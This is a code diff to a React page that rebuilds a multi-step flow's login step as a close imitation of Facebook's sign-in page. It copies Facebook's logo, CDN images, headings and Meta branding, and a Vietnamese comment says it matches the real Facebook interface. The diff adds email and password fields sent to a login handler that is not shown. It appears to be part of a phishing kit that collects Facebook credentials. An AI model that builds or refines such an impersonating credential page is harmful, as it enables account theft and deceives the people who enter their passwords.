@@ -729,35 +729,96 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 2: LOGIN FULL PAGE */}
+                            {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn giao diện Facebook thật */}
               {step === 2 && (
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', width: '100%', maxWidth: '400px', margin: '60px auto 0 auto' }}>
-                  <div style={{ background: '#fff', border: '1px solid #ced0d4', borderRadius: '8px', padding: '32px 24px', width: '100%', boxSizing: 'border-box', boxShadow: '0 12px 28px rgba(0,0,0,0.1)' }}>
-                    
-                    <div style={{ textAlign: 'center', marginBottom: '24px' }}>
-                        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
+                <div style={{ display: 'flex', minHeight: '100vh', background: '#fff' }}>
+                  
+                  {/* CỘT TRÁI: Ảnh minh họa và Text */}
+                  <div style={{ flex: 1, display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', padding: '40px', borderRight: '1px solid #e4e6eb', backgroundColor: '#fff' }}>
+                    <div style={{ maxWidth: '500px' }}>
+                       {/* Logo chữ Facebook nhỏ góc trên */}
+                      <svg viewBox="0 0 36 36" height="40" width="40" style={{ marginBottom: '40px' }}>
+                        <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
+                      </svg>
+                      
+                      <h1 style={{ fontSize: '48px', fontWeight: '700', lineHeight: '1.2', color: '#1c2b33', marginBottom: '20px' }}>
+                        Explore the things <br />
+                        <span style={{ color: '#0064e0' }}>you love.</span>
+                      </h1>
+                      
+                      {/* Ảnh minh họa lớn */}
+                      <img 
+                        src="https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp" 
+                        alt="Explore" 
+                        style={{ width: '100%', maxWidth: '500px', display: 'block', marginTop: '20px' }} 
+                      />
                     </div>
+                  </div>
 
-                    <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                        <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
-                        <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
+                  {/* CỘT PHẢI: Form đăng nhập */}
+                  <div style={{ flex: 1, display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', padding: '40px' }}>
+                    <div style={{ width: '100%', maxWidth: '396px' }}>
+                      
+                      <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', marginBottom: '20px' }}>
+                        Log into Facebook
+                      </h2>
+
+                      <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                        <input 
+                          className="fb-input" 
+                          placeholder="Email or mobile number" 
+                          value={loginUser} 
+                          onChange={e => setLoginUser(e.target.value)} 
+                          required 
+                          autoComplete="off" 
+                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px' }}
+                        />
                         
-                        {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.loginError}</div>}
+                        <input 
+                          className="fb-input" 
+                          type="password" 
+                          placeholder="Password" 
+                          value={loginPass} 
+                          onChange={e => setLoginPass(e.target.value)} 
+                          required 
+                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px' }}
+                        />
                         
-                        <button type="submit" className="fb-btn" disabled={loading} style={{ marginTop: '8px' }}>
-                          {loading ? 'Logging in...' : t.loginBtn}
+                        {showLoginError && <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '4px' }}>{t.loginError}</div>}
+                        
+                        <button type="submit" disabled={loading} style={{
+                          width: '100%', padding: '14px', borderRadius: '100px', border: 'none',
+                          background: '#0866FF', color: '#fff', fontSize: '18px', fontWeight: '600', cursor: 'pointer', marginTop: '8px'
+                        }}>
+                          {loading ? 'Logging in...' : 'Log in'}
                         </button>
-                    </form>
+                      </form>
 
-                    <div style={{ textAlign: 'center', marginTop: '20px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
-                      <button 
-                        onClick={() => setStep(1.5)} 
-                        style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '14px', fontWeight: '600', cursor: 'pointer' }}
-                      >
-                        Back
-                      </button>
+                      <div style={{ textAlign: 'center', marginTop: '20px' }}>
+                        <a href="#" style={{ color: '#0866FF', fontSize: '14px', textDecoration: 'none' }}>Forgot password?</a>
+                      </div>
+
+                      <div style={{ marginTop: '40px', paddingTop: '20px', borderTop: '1px solid #e4e6eb', textAlign: 'center' }}>
+                        <button type="button" style={{
+                          padding: '12px 24px', borderRadius: '100px', border: '1px solid #0866FF',
+                          background: 'transparent', color: '#0866FF', fontSize: '16px', fontWeight: '600', cursor: 'pointer'
+                        }}>
+                          Create new account
+                        </button>
+                      </div>
+
+                      <div style={{ textAlign: 'center', marginTop: '24px' }}>
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
+                      </div>
+
+                      {/* Nút Back để quay lại */}
+                      <div style={{ textAlign: 'center', marginTop: '30px' }}>
+                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '14px', fontWeight: '600', cursor: 'pointer' }}>
+                          Back
+                        </button>
+                      </div>
+
                     </div>
-
                   </div>
                 </div>
               )}
